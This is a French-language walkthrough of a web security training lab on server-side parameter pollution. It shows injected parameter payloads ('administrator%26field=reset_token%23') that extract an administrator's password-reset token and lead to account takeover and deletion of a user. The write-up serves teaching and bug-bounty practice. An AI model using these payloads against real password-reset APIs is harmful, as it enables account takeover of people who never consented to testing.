
# 🎯 📌 Objectif du lab

> Exploiter une **pollution de paramètres côté serveur** pour :

- récupérer un **reset token admin**
- réinitialiser son mot de passe
- se connecter en `administrator`
- supprimer `carlos`

---

# 🧩 🏗️ Architecture implicite

```
[User Input]
     ↓
POST /forgot-password
     ↓ (reconstruction backend)
GET /users/search?username=...&field=email
     ↓
[API interne]
     ↓
[BDD]
```

👉 Le backend **reconstruit une requête interne** avec nos données.

---

# 💥 🧠 Vulnérabilité

> Le serveur injecte directement `username` dans une requête interne **sans filtrage**

```
internal_request = "username=" + user_input + "&field=email"
```

---

# 🔐 🔑 URL Encoding (rappel)

|Caractère|Encodé|Rôle|
|---|---|---|
|`&`|`%26`|ajoute un paramètre|
|`#`|`%23`|coupe la requête|

---

# 🧪 🔍 Étapes d’exploitation

---

## 1️⃣ Injection de paramètre (`&`)

```
username=administrator%26x=y
```

👉 devient :

```
username=administrator&x=y
```

👉 réponse :

```
Parameter is not supported
```

---

### 🧠 Conclusion

> 💥 On peut injecter des paramètres backend

---

## 2️⃣ Troncature (`#`)

```
username=administrator%23
```

👉 backend :

```
username=administrator#&field=email
```

👉 devient :

```
username=administrator
```

👉 réponse :

```
Field not specified
```

---

### 🧠 Conclusion

> 💥 Il existe un paramètre caché : `field`

---

## 3️⃣ Test du paramètre `field`

```
username=administrator%26field=x%23
```

👉 réponse :

```
Invalid field
```

---

### 🧠 Conclusion

> 💥 `field` existe et est contrôlable

---

## 4️⃣ Bruteforce des valeurs (`Intruder`)

Payload :

```
username=administrator%26field=§PAYLOAD§%23
```

Liste utilisée :  
👉 **Server-side variable names**

---

### 🎯 Résultat

|   |   |
|---|---|
|field|résultat|
|email|valide|
|reset_token|💥 critique|

---

## 5️⃣ Extraction du token admin

```
username=administrator%26field=reset_token%23
```

👉 réponse :

```
{
  "type": "reset_token",
  "result": "TOKEN_ADMIN"
}
```

---

# 🌐 🔍 Analyse du JavaScript

## 📂 Accès

### Méthode Burp :

```
Proxy → HTTP history → /static/js/forgotPassword.js
```

### Méthode navigateur :

```
F12 → Network → JS → forgotPassword.js
```

---

## 🔎 Recherche

👉 `CTRL + F` → `reset`

---

## 💥 Ligne clé

```
window.location.href = `/forgot-password?reset_token=${resetToken}`;
```

---

### 🧠 Interprétation

|   |   |
|---|---|
|Élément|Signification|
|endpoint|`/forgot-password`|
|paramètre|`reset_token`|

---

👉 Donc :

> ❗ Le bon paramètre frontend = `reset_token`

---

# 🔐 🔄 Reset du mot de passe

👉 Naviguer vers :

```
/forgot-password?reset_token=TOKEN_ADMIN
```

---

👉 Entrer un nouveau mot de passe

---

# 🔓 🔑 Exploitation finale

1. login :

```
administrator / new_password
```

2. accéder au panel admin
3. supprimer :

```
carlos
```

---

# 🧠 💡 Ce que ce lab enseigne

---

## 🔥 1. SSPP = contrôle de requête interne

👉 tu modifies ce que le backend envoie à son API

---

## 🔥 2. Les erreurs backend = fuite d’information

|   |   |
|---|---|
|erreur|signification|
|Parameter not supported|param injecté|
|Field not specified|param requis|
|Invalid field|valeur invalide|

---

## 🔥 3. Frontend = source de vérité

👉 JS révèle :

- endpoints
- paramètres
- logique métier

---

## 🔥 4. Workflow réel bug bounty

1. identifier endpoint
2. injecter (`&`)
3. tronquer (`#`)
4. analyser erreurs
5. découvrir paramètre
6. bruteforce valeurs
7. trouver donnée sensible
8. exploiter

---

# 🎯 📊 Catégorisation

|   |   |
|---|---|
|Type|Catégorie|
|Vulnérabilité|API|
|Sous-type|Hidden Parameters|
|Technique|SSPP|
|Impact|Account Takeover|

---

# 🧠 🧩 Résumé ultra clair

👉 `&` → injecter  
👉 `#` → supprimer  
👉 erreurs → indices  
👉 `field` → param caché  
👉 `reset_token` → donnée critique  
👉 JS → vérité du backend

---

# 💬 🏁 Conclusion

> 💥 Tu n’as pas deviné la faille  
> 👉 tu l’as reconstruite à partir du comportement backend

---

👉 Ce lab = **modèle réel de bug bounty API**